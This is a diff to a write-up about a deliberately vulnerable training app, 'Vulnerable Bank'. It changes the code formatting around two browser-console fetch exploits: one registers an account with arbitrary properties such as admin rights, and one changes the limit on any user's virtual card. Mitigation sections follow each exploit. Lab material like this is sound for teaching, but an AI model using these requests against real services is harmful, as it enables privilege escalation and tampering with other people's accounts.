@@ -13,7 +13,7 @@ Allows attacker to create a user account with any properties and values (e.g. ad
 1. Navigate/return to base URL (Vulnerable Bank homepage) and open the browser console.
 2. Issue the following fetch request as a command and observe the outcome:
 
-    `fetch('http://localhost:5000/register', {
+    ```fetch('http://localhost:5000/register', {
     method: 'POST',
     headers: {
         'Content-Type': 'application/json'
@@ -26,8 +26,7 @@ Allows attacker to create a user account with any properties and values (e.g. ad
     })
     })
     .then(response => response.json())
-    .then(data => console.log(JSON.stringify(data, null, 2)))`
-
+    .then(data => console.log(JSON.stringify(data, null, 2)))
 ![alt text](./screenshots/image-14.png)
 
 #### Mitigate
@@ -40,7 +39,7 @@ Allows attacker to change the limit of any virtual card.
 1. Log in as any user or navigate/return to root URL (Vulnerable Bank homepage) and open the browser console.
 2. Issue the following fetch request as a command -- where <vc_num> is a Virtual Card ID of any user -- and observe outcome:
 
-    `fetch('/api/virtual-cards/<vc_num>/update-limit', {
+    ```fetch('/api/virtual-cards/<vc_num>/update-limit', {
     method: 'POST',
     headers: {
         'Content-Type': 'application/json',
@@ -53,7 +52,7 @@ Allows attacker to change the limit of any virtual card.
     }).then(async (r) => {
     console.log('HTTP', r.status);
     console.log(await r.json());
-    });`
+    });
 
 ![alt text](./screenshots/image-16.png)
 
